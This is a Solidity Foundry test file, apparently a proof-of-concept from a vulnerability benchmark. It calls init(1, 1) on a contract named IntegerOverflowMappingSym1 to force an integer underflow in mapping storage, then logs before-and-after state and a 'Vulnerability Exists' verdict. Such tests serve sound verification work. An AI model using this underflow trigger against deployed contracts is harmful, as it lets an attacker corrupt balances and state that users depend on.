// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_mapping_sym_1.sol";

contract IntegerOverflowMappingSym1Test is Test {
    IntegerOverflowMappingSym1 public targetContract;
    address testUser = address(0x1234);

    function setUp() public {
        targetContract = new IntegerOverflowMappingSym1();
    }

    function test_integerUnderflowInInit() public {
        // Get initial state values before triggering vulnerability
        console2.log("--- BEFORE-Trigger Operation ---");
        uint256 mappingBefore = targetContract.getMapValue(1);
        uint256 userOpsBefore = targetContract.getUserOperationCount(testUser);
        uint256 totalOpsBefore = targetContract.totalOperations();
        uint256 lastOpTimeBefore = targetContract.lastOperationTime();
        
        console2.log("Initial mapping value (key=1):", mappingBefore);
        console2.log("Initial user operations:", userOpsBefore);
        console2.log("Initial total operations:", totalOpsBefore);
        console2.log("Initial last operation time:", lastOpTimeBefore);
        
        console2.log("--- Trigger Underflow ---");
        // Trigger underflow by attempting to subtract 1 from mapping value 0
        vm.prank(testUser);
        targetContract.init(1, 1);

        // Get state values after triggering vulnerability
        console2.log("--- AFTER-Trigger Operation ---");
        uint256 mappingAfter = targetContract.getMapValue(1);
        uint256 userOpsAfter = targetContract.getUserOperationCount(testUser);
        uint256 totalOpsAfter = targetContract.totalOperations();
        uint256 lastOpTimeAfter = targetContract.lastOperationTime();
        
        console2.log("Final mapping value (key=1):", mappingAfter);
        console2.log("Final user operations:", userOpsAfter);
        console2.log("Final total operations:", totalOpsAfter);
        console2.log("Final last operation time:", lastOpTimeAfter);
        
        // Differential comparison
        console2.log("--- Vulnerability Verification ---");
        bool mappingChanged = mappingAfter == type(uint256).max;
        bool userOpsIncreased = userOpsAfter == userOpsBefore + 1;
        bool totalOpsIncreased = totalOpsAfter == totalOpsBefore + 1;
        bool timeUpdated = lastOpTimeAfter > lastOpTimeBefore;
        
        console2.log("Mapping overflow occurred:", mappingChanged ? "YES" : "NO");
        console2.log("User ops increased:", userOpsIncreased ? "YES" : "NO");
        console2.log("Total ops increased:", totalOpsIncreased ? "YES" : "NO");
        console2.log("Operation time updated:", timeUpdated ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (mappingChanged) {
            console2.log("Vulnerability Exists: Integer underflow successfully manipulated mapping storage");
        } else {
            console2.log("Vulnerability not Exist: Mapping value unchanged - underflow not triggered");
        }
    }
}